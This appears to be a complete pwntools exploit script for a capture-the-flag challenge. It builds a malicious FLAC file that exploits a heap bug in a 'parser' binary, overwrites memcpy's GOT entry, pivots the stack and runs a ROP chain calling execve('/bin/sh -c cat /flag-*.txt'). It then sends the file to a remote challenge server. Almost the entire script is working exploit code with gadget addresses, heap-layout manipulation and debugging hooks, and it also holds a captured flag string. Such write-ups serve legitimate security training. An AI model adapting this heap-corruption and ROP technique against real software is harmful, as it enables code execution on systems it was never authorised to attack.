#!/usr/bin/env python3

from contextlib import contextmanager
import struct
from io import BytesIO
from tempfile import NamedTemporaryFile
import subprocess

from pwn import *


FLAC_MAGIC = 0x664C6143
SIZEOF_STREAMINFO = 34
TYPE_STREAMINFO = 0
TYPE_PADDING = 1
TYPE_APPLICATION = 2
TYPE_SEEKTABLE = 3
TYPE_VORBIS_COMMENT = 4
TYPE_CUESHEET = 5
TYPE_PICTURE = 6

# 0x100 - 0x8 * 24: r10
# 0x100: rsi
# 0x100 + 0x8 *  1: r10
# 0x100 + 0x8 *  1: none?
MEMCPY_GOT = 0x5DC100

"""
0x000000000052fed1 : mov esp, esi ; jmp 0x52fd11

(gdb) x/10i 0x52fd11
   0x52fd11 <tsearch+321>:      add    rsp,0x28
   0x52fd15 <tsearch+325>:      mov    rax,r12
   0x52fd18 <tsearch+328>:      pop    rbx
   0x52fd19 <tsearch+329>:      pop    rbp
   0x52fd1a <tsearch+330>:      pop    r12
   0x52fd1c <tsearch+332>:      pop    r13
   0x52fd1e <tsearch+334>:      pop    r14
   0x52fd20 <tsearch+336>:      pop    r15
   0x52fd22 <tsearch+338>:      ret
"""

stack_pivot = 0x52FED1

"""
put b"xxxxxxxx" on stack after pivot

(gdb) x/30gx $rsp
0x24c959c:      0x7878787878787878      0x4242424242424242
0x24c95ac:      0x4242424242424242      0x4242424242424242
0x24c95bc:      0x4242424242424242      0x4242424242424242
0x24c95cc:      0x4242424242424242      0x4242424242424242
0x24c95dc:      0x4242424242424242      0x4242424242424242
0x24c95ec:      0x0000080000044242      0x0006000000000000
0x24c95fc:      0x0000000000002020      0x0000000000000000
0x24c960c:      0x0000000000000000      0x0000000000000000
0x24c961c:      0x4343434343430020      0x4343434343434343
0x24c962c:      0x4343434343434343      0x4343434343434343
0x24c963c:      0x4343434343434343      0x4343434343434343
0x24c964c:      0x4343434343434343      0x4343434343434343
0x24c965c:      0x4343434343434343      0x4343434343434343
0x24c966c:      0x4343434343434343      0x4343434343434343
0x24c967c:      0x4343434343434343      0x4343434343434343
"""

"""
0x0000000000408236 : add esp, 0x18 ; ret
0x0000000000414a7c : add esp, 0x28 ; ret
0x000000000055e445 : add esp, 0x30 ; ret
0x000000000053431c : add esp, 0x38 ; ret
0x000000000052f385 : add esp, 0x58 ; ret
0x000000000052e8bd : add esp, 0x68 ; ret
0x000000000054fac7 : add esp, 0x78 ; ret
0x00000000004adb3f : add esp, 0x98 ; ret
0x00000000004cfa0b : add esp, 0xd8 ; ret
"""

stack_advance = 0x4ADB3F

"""
0x00000000004a7fd9 : syscall
0x000000000042111a : pop rax ; ret
0x000000000040591d : pop rdi ; ret
0x00000000004073a3 : pop rsi ; ret
0x00000000004a566b : mov rdx, rdi ; ret
0x0000000000419c3f : mov qword ptr [rdi], rax ; ret
"""

syscall = 0x4A7FD9
pop_rax_ret = 0x42111A
pop_rdi_ret = 0x40591D
pop_rsi_ret = 0x4073A3
mov_rdx_rdi_ret = 0x4A566B
mov_ptr_rdi_rax_ret = 0x419C3F
__NR_execve = 59
pop_rdx_rbx_ret = 0x533DAB


def generate_magic(fp):
    fp.write(struct.pack(">I", FLAC_MAGIC))


def generate_byte(fp, val: int):
    fp.write(bytes((val,)))


def generate_big16(fp, val: int):
    generate_byte(fp, (val >> 8) & 0xFF)
    generate_byte(fp, val & 0xFF)


def generate_big24(fp, val: int):
    generate_byte(fp, (val >> 16) & 0xFF)
    generate_big16(fp, val)


def generate_big32(fp, val: int):
    generate_byte(fp, (val >> 24) & 0xFF)
    generate_big24(fp, val)


def generate_big64(fp, val: int):
    generate_big32(fp, (val >> 32) & 0xFFFFFFFF)
    generate_big32(fp, val)


def generate_block_header(fp, last: bool, tpe: int, size: int):
    generate_byte(fp, (0x80 if last else 0) | tpe)
    generate_big24(fp, size)


def generate_streaminfo(fp):
    generate_block_header(fp, False, TYPE_STREAMINFO, SIZEOF_STREAMINFO)
    fp.write(b"I" * SIZEOF_STREAMINFO)


def generate_application(fp, app_id, data):
    generate_block_header(fp, False, TYPE_APPLICATION, 4 + len(data))
    generate_big32(fp, len(data))
    fp.write(data)


def generate_seektable(fp, vals):
    assert len(vals) % 3 == 0
    generate_block_header(fp, False, TYPE_SEEKTABLE, 18 * (len(vals) // 3))
    for i, val in enumerate(vals):
        if (i % 3) == 2:
            assert val < 0x10000
            generate_big16(fp, val)
        else:
            generate_big64(fp, val)


def generate_vorbis_comment(fp, vendor=b""):
    generate_block_header(fp, False, TYPE_VORBIS_COMMENT, 8 + len(vendor))
    fp.write(struct.pack("<I", len(vendor)))
    fp.write(vendor)
    # count
    fp.write(b"\x00" * 4)


def generate_picture(fp, data):
    generate_block_header(fp, False, TYPE_PICTURE, 32 + len(data))
    # type, _picture->mime x2, width, height, colorDepth, colorCount
    fp.write(b"\x00" * 28)
    generate_big32(fp, len(data))
    fp.write(data)


def generate(fp):
    # Mandatory.
    generate_magic(fp)
    generate_streaminfo(fp)
    # libstdc++ allocates an I/O buffer very early.
    # Create an application data buffer that is close to the I/O buffer.
    #
    # We will overwrite memcpy@got, and it will trigger with $rsi pointing as
    # close to the end of this buffer as possible - this is ensured by the
    # padding of the final generate_vorbis_comment().
    #
    # stack_pivot will set $rsp to $rsi and advance it a bit. At the end it
    # will point to application data buffer + 4.
    generate_application(
        fp,
        0,
        flat(
            {
                4: b"".join(
                    (
                        struct.pack("<QQ", pop_rax_ret, __NR_execve),
                        struct.pack("<QQ", pop_rdi_ret, MEMCPY_GOT + 40),
                        struct.pack("<QQ", pop_rsi_ret, MEMCPY_GOT + 8),
                        struct.pack("<QQQ", pop_rdx_rbx_ret, MEMCPY_GOT + 32, 0),
                        struct.pack("<Q", syscall),
                        struct.pack("<Q", 0x55555555),
                    )
                ),
            },
            length=0x60,
        ),
    )
    # A picture to be freed.
    generate_picture(fp, b"A" * 216)
    # A victim object right after the picture.
    generate_vorbis_comment(fp)
    # Generate a tcache chunk before the victim.
    generate_picture(fp, b"A" * 256)
    # Bug: _seekPointsCount is not reset.
    # Allocate SeekTableBuffer at the unsorted chunk and overwrite the victim's
    # std::string.
    # VorbisComment - SeekTableBuffer = 224 = 24 * 9 + 8
    vals = [0, 0, 0] * 9
    generate_seektable(fp, vals)
    # Avoid resizing SeekTable, so use the same size.
    vals[1] = MEMCPY_GOT
    vals[2] = 0xFFFF
    generate_seektable(fp, vals)
    # Overwrite memcpy@got.
    generate_vorbis_comment(
        fp,
        flat(
            {
                0: struct.pack("<Q", stack_pivot),
                8: struct.pack("<Q", MEMCPY_GOT + 40),
                16: struct.pack("<Q", MEMCPY_GOT + 48),
                24: struct.pack("<Q", MEMCPY_GOT + 56),
                32: struct.pack("<Q", 0),
                40: b"/bin/sh\0",
                48: b"-c\0",
                56: b"cat /flag-*.txt\0",
                # BHFlagY{5652a802d5b02d0d9fce74001bc07c90}
            },
            length=7146,
        ),
    )
    fp.flush()


@contextmanager
def connect():
    if args.LOCAL:
        with NamedTemporaryFile() as fp:
            generate(fp)
            print("size = " + str(fp.tell()))
            if args.GDB:
                tube = gdb.debug(["./parser", fp.name], api=True)

                class StreamInfo(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x4048DC")

                    def stop(self):
                        print(
                            "StreamInfo = " + hex(int(tube.gdb.parse_and_eval("$rax")))
                        )

                StreamInfo()

                class Application(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x407154")
                        self.val = None

                    def stop(self):
                        self.val = int(tube.gdb.parse_and_eval("$rax"))
                        print("Application = " + hex(self.val))

                Application()

                class VorbisComment(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x407002")
                        self.val = None

                    def stop(self):
                        self.val = int(tube.gdb.parse_and_eval("$rax"))
                        print("VorbisComment = " + hex(self.val))

                vorbis_comment = VorbisComment()

                class Picture(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x40672A")

                    def stop(self):
                        print("Picture = " + hex(int(tube.gdb.parse_and_eval("$rax"))))

                Picture()

                class PictureBuffer(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x4067D0")

                    def stop(self):
                        print(
                            "PictureBuffer = "
                            + hex(int(tube.gdb.parse_and_eval("$rax")))
                        )

                PictureBuffer()

                class SeekTableBufferSize(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x407AB5")
                        self.val = None

                    def stop(self):
                        self.val = int(tube.gdb.parse_and_eval("$rdi"))
                        print("SeekTableBufferSize = " + hex(self.val))

                SeekTableBufferSize()

                class SeekTableBuffer(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x407ABF")
                        self.val = None

                    def stop(self):
                        self.val = int(tube.gdb.parse_and_eval("$rax"))
                        print(
                            "SeekTableBuffer = "
                            + hex(self.val)
                            + " = VorbisComment - "
                            + hex(vorbis_comment.val - self.val)
                        )

                SeekTableBuffer()

                class Write1(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x406CD0")
                        self.val = None

                    def stop(self):
                        dst = int(tube.gdb.parse_and_eval("$rax"))
                        val = int(tube.gdb.parse_and_eval("$rdx"))
                        print("*" + hex(dst) + " <- " + hex(val))

                # Write1()

                class Write2(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x406D13")
                        self.val = None

                    def stop(self):
                        dst = int(tube.gdb.parse_and_eval("$rax + 8"))
                        val = int(tube.gdb.parse_and_eval("$rdx"))
                        print("*" + hex(dst) + " <- " + hex(val))

                # Write2()

                class Write3(tube.gdb.Breakpoint):
                    def __init__(self):
                        super().__init__("*0x406D57")
                        self.val = None

                    def stop(self):
                        dst = int(tube.gdb.parse_and_eval("$rdx + 10"))
                        val = int(tube.gdb.parse_and_eval("$cx"))
                        print("*" + hex(dst) + " <- " + hex(val))

                # Write3()

                tube.gdb.continue_nowait()
                yield tube
            else:
                yield process(["./parser", fp.name])
    else:
        yield remote("3.255.127.32", 32597)


def main():
    with connect() as tube:
        if not args.LOCAL:
            tube.recvuntil(b"proof of work:\n")
            pow_cmd = tube.recvline()
            pow_cmd = pow_cmd.replace(b"curl ", b"curl --connect-timeout 10 ")
            result = subprocess.check_output(
                [
                    "docker",
                    "run",
                    "-it",
                    "--rm",
                    "--entrypoint=/bin/sh",
                    "alpine/curl",
                    "-c",
                    pow_cmd,
                ]
            ).strip()
            tube.sendlineafter(b"solution: ", result)
            buf = BytesIO()
            generate(buf)
            buf = buf.getvalue()
            size = str(len(buf)).encode("ascii")
            print("size =", size)
            print("file =", buf)
            tube.sendlineafter(b"Size: ", size)
            tube.sendafter(b"File: ", buf)
        tube.interactive()


if __name__ == "__main__":
    main()
